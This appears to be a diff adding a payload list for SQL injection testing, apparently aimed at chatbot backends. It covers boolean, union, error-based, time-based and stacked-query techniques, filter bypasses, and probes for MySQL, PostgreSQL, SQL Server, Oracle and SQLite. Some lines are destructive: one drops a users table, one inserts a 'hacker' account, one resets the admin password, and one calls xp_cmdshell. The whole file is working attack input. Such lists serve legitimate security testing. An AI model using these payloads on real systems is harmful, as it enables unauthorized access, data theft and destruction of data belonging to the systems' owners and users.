@@ -1,0 +1,65 @@
+# SQL Injection Payloads
+# Basic SQL injection payloads for testing chatbot security
+
+# Classic boolean-based payloads
+' OR 1=1 --
+' OR '1'='1
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+admin'/*
+
+# Union-based payloads
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT user(), database(), version() --
+
+# Error-based payloads
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
+
+# Time-based blind payloads
+'; WAITFOR DELAY '00:00:05' --
+'; SELECT SLEEP(5) --
+' AND SLEEP(5) --
+' OR SLEEP(5) --
+1' AND (SELECT SLEEP(5)) --
+
+# Stacked queries
+'; DROP TABLE users; --
+'; INSERT INTO users VALUES ('hacker', 'password'); --
+'; UPDATE users SET password='hacked' WHERE username='admin'; --
+
+# Bypass attempts
+' OR 'x'='x
+' OR "x"="x
+') OR ('1'='1
+') OR ("1"="1
+'/**/OR/**/1=1--
+'+OR+1=1--
+'%20OR%201=1--
+
+# Database-specific payloads
+# MySQL
+' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --
+' AND (SELECT COUNT(*) FROM mysql.user) > 0 --
+
+# PostgreSQL
+' AND (SELECT version()) LIKE '%PostgreSQL%' --
+' AND (SELECT COUNT(*) FROM pg_tables) > 0 --
+
+# SQL Server
+' AND (SELECT @@version) LIKE '%Microsoft%' --
+'; EXEC xp_cmdshell('ping 127.0.0.1') --
+
+# Oracle
+' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%' --
+' AND (SELECT COUNT(*) FROM all_tables) > 0 --
+
+# SQLite
+' AND (SELECT sqlite_version()) LIKE '%3.%' --
+' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --
